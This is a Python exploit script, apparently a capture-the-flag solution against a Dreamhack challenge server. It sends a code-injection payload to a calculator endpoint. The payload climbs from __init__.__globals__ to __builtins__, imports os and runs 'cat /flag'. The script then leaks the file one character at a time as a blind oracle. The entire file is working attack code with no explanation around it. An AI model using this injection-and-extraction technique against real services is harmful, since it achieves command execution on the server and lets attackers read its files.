import requests
import string

charset = string.ascii_letters + string.digits + '!#$%&()*+,-./:;<=>?@[]^_`{|}~'

url = "http://host8.dreamhack.games:12487/"

flag = "pokactf2024{"

while not flag.endswith("}"):
    for char in charset:
        print("Flag:", flag, "|", "Trying:", char)

        payload = f'''(self.__init__.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()[{len(flag)}]=='{char}')+0'''

        res = requests.post(f'{url}/cal', data={'a': payload, 'b': "0"}).text

        header = "<p>"
        res = res[res.index(header):]
        res = res[:res.index("</p>")].lstrip(header).strip()

        if res == "1":
            flag += char
            break
        elif res != "0":
            print("Error:", res)

print("Flag:", flag)